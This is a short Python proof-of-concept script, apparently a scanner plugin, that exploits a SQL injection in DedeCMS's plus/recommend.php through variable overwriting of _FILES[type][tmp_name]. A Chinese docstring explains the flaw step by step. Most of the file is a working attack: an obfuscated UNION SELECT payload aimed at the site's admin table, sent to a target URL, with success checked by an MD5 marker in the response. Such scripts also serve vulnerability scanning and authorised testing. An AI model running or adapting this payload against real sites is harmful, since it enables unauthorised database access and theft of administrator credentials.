#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: dedecms recommend.php SQL注入
referer: http://blog.csdn.net/change518/article/details/20564207
author: Lucifer
description: 1.首先执行到plus/recommand.php，包含了include/common.inc.php
        2.只要提交的URL中不包含cfg_|GLOBALS|_GET|_POST|_COOKIE，即可通过检查，_FILES[type][tmp_name]被带入
        3.在29行处，URL参数中的_FILES[type][tmp_name]，$_key为type，$$_key即为$type，从而导致了$type变量的覆盖
        4.回到recommand.php中，注入语句被带入数据库查询
'''
import HackRequests

def poc(arg, **kwargs):
    headers = {
        "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
    }
    payload = "/plus/recommend.php?aid=1&_FILES[type][name]&_FILES[type][size]&_FILES[type][type]&_FILES[type][tmp_name]=aa%5c%27AnD+ChAr(@`%27`)+/*!50000Union*/+/*!50000SeLect*/+1,2,3,md5(1234),5,6,7,8,9%20FrOm%20`%23@__admin`%23"
    vulnurl = arg + payload
    hh = HackRequests.hackRequests()
    try:
        r = hh.http(vulnurl,headers=headers)

        if r"81dc9bdb52d04dc20036dbd8313ed055" in r.text():
            result = {
                "name": "dedecms recommend sql注入",  # 插件名称
                "content": '''1.首先执行到plus/recommand.php，包含了include/common.inc.php
        2.只要提交的URL中不包含cfg_|GLOBALS|_GET|_POST|_COOKIE，即可通过检查，_FILES[type][tmp_name]被带入
        3.在29行处，URL参数中的_FILES[type][tmp_name]，$_key为type，$$_key即为$type，从而导致了$type变量的覆盖
        4.回到recommand.php中，注入语句被带入数据库查询''',  # 插件返回内容详情，会造成什么后果。
                "url": vulnurl,  # 漏洞存在url
                "log": r.log,
                "tag": "sql_inject"  # 漏洞标签
            }
            return result

    except:
        return False
